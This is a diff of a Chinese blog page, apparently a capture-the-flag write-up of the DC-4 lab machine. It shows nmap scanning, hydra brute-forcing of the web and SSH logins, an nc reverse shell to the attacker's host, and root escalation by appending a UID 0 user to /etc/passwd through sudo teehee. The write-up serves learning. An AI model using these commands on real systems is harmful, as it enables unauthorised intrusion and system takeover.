@@ -17,7 +17,7 @@
   localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
   translate: undefined,
   noticeOutdate: undefined,
-  highlight: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
   copy: {
     success: '复制成功',
     error: '复制错误',
@@ -156,15 +156,15 @@
     })(window)</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/static-butterfly/dist/css/index.min.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2024/08/08/zZWaxXAdoB6sS8e.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">59</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">52</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/image/bk_image/bg3.png')"><nav id="nav"><span id="blog-info"><a href="/" title="You_zip"><span class="site-name">You_zip</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">DC-4</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-08-12T08:46:53.905Z" title="发表于 2024-08-12 16:46:53">2024-08-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-08-12T14:38:26.018Z" title="更新于 2024-08-12 22:38:26">2024-08-12</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="DC-4"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><em>靶机：192.168.174.190</em></p>
 <p><em>攻击机：192.168.174.137</em></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44288604/article/details/108018008">https://blog.csdn.net/weixin_44288604/article/details/108018008</a></p>
-<h1 id="DC4"><a href="#DC4" class="headerlink" title="DC4"></a>DC4</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><pre><code>arp-scan -l
-</code></pre>
+<h1 id="DC4"><a href="#DC4" class="headerlink" title="DC4"></a>DC4</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240812191355364.png" alt="image-20240812191355364"></p>
-<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre><code>nmap -p- -n -O 192.168.174.190
-</code></pre>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p- -n -O 192.168.174.190</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240812191541835.png" alt="image-20240812191541835"></p>
 <p>开放了22，80端口</p>
-<pre><code>nmap -p 22,80 -A 192.168.174.190
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p 22,80 -A 192.168.174.190</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240812191737988.png" alt="image-20240812191737988"></p>
 <h2 id="访问服务-目录扫描"><a href="#访问服务-目录扫描" class="headerlink" title="访问服务+目录扫描"></a>访问服务+目录扫描</h2><p><img src="/../image/image-20240812191819031.png" alt="image-20240812191819031"></p>
 <p>登陆界面，可以尝试爆破</p>
@@ -173,8 +173,8 @@
 <h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><p>burp抓包，传字典，可以去一些爆破工具的目录下，看看，这里用的是&#x2F;usr&#x2F;share&#x2F;jhon&#x2F;password.lst</p>
 <p><img src="/../image/image-20240812193318974.png" alt="image-20240812193318974"></p>
 <p>也可以用hydra</p>
-<pre><code>hydra -t 1 -l admin -P/usr/jhon/password.lst -o out.txt -vV -f 192.168.174.190 http-post-form &quot;/:username=^USER^&amp;password=^PASS^:error&quot;
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -t 1 -l admin -P/usr/jhon/password.lst -o out.txt -vV -f 192.168.174.190 http-post-form &quot;/:username=^USER^&amp;password=^PASS^:error&quot;</span><br></pre></td></tr></table></figure>
+
 <p>但判断条件不好写，所以还是不用了</p>
 <h2 id="登陆"><a href="#登陆" class="headerlink" title="登陆"></a>登陆</h2><p><img src="/../image/image-20240812193453913.png" alt="image-20240812193453913"></p>
 <p>发现命令执行</p>
@@ -193,33 +193,27 @@
 <p>在backups目录下发现旧密码，查看一下，估计就是利用字典爆破登陆jim执行test.sh</p>
 <p><img src="/../image/image-20240812200614127.png" alt="image-20240812200614127"></p>
 <p>是一个字典，给它保存下来，利用hydra爆破</p>
-<h2 id="SSH爆破"><a href="#SSH爆破" class="headerlink" title="SSH爆破"></a>SSH爆破</h2><pre><code>hydra -l jim -P wordlist.txt ssh://192.168.174.190 -vV -o hydra.ssh
-</code></pre>
+<h2 id="SSH爆破"><a href="#SSH爆破" class="headerlink" title="SSH爆破"></a>SSH爆破</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l jim -P wordlist.txt ssh://192.168.174.190 -vV -o hydra.ssh</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240812201547595.png" alt="image-20240812201547595"></p>
 <p>成功爆破密码，ssh远程登陆尝试</p>
 <h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>除了这种爆破的方式还可以通过反弹shell的方式获取权限</p>
 <p>试过bash但好像因为&amp;这个符号得原因，执行不了</p>
 <p>反弹不回来，得换个思路，看下靶机有没有装nc</p>
-<pre><code>nc -c /bin/bash 192.168.174.137 8888
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -c /bin/bash 192.168.174.137 8888</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240812223004648.png" alt="image-20240812223004648"></p>
 <p>然后可以</p>
-<pre><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
-</code></pre>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><pre><code>ssh jim@192.168.174.190 
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh jim@192.168.174.190 </span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240812201721959.png" alt="image-20240812201721959"></p>
 <p>sudo -l发现没有sudo权限，打开刚刚的test.sh文件,</p>
-<pre><code class="shell">!/bin/bash
-for i in &#123;1..5&#125;
-do
- sleep 1
- echo &quot;Learn bash they said.&quot;
- sleep 1
- echo &quot;Bash is good they said.&quot;
-done
- echo &quot;But I&#39;d rather bash my head against a brick wall.&quot;
-</code></pre>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">!/bin/bash</span><br><span class="line">for i in &#123;1..5&#125;</span><br><span class="line">do</span><br><span class="line"> sleep 1</span><br><span class="line"> echo &quot;Learn bash they said.&quot;</span><br><span class="line"> sleep 1</span><br><span class="line"> echo &quot;Bash is good they said.&quot;</span><br><span class="line">done</span><br><span class="line"> echo &quot;But I&#x27;d rather bash my head against a brick wall.&quot;</span><br></pre></td></tr></table></figure>
+
 <p>没什么线索，看看剩下那个文件</p>
 <p><img src="/../image/image-20240812201919318.png" alt="image-20240812201919318"></p>
 <p>是一封rooot发来的信，看不出来什么信息，去<code>/var/mail</code>再看看有没有其他有意思的信息，找到了一封charles写给jim的邮件，并且看到了charles的账户密码</p>
@@ -230,8 +224,8 @@ done
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zlgxzswjy/p/16118468.html">https://www.cnblogs.com/zlgxzswjy/p/16118468.html</a></p>
 <p>teehee是个小众的linux编辑器。如果有sudo权限。可以利用其来提权</p>
 <p>核心思路就是利用其在passwd文件中追加一条uid为0的用户条目</p>
-<pre><code>echo &quot;raaj::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;raaj::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br></pre></td></tr></table></figure>
+
 <p>按照linux用户机制，如果没有shadow条目，且passwd用户密码条目为空的时候，可以本地直接su空密码登录。所以只需要执行su raaj就可以登录到raaj用户，这个用户因为uid为0，所以也是root权限</p>
 <p><img src="/../image/image-20240812221552502.png" alt="image-20240812221552502"></p>
 <p>然后我们su切换用户</p>
